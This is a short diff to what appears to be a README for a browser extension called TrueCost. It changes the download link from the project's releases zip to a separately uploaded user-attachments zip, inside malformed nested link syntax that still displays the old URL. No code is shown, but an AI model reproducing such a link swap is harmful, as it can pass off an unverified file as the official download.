@@ -26,7 +26,7 @@ TrueCost is available for Household users only. You'll need an existing Househol
 
 ### Step 1 — Download
 
-👉 **[Download TrueCost v1.0.0](https://github.com/brewster-web/truecost/releases/latest/download/truecost-extension.zip)**
+👉 **[Download TrueCost v1.0.0]([https://github.com/brewster-web/truecost/releases/latest/download/truecost-extension.zip](https://github.com/user-attachments/files/26167270/truecost-extension.zip))**
 
 ### Step 2 — Unzip
 
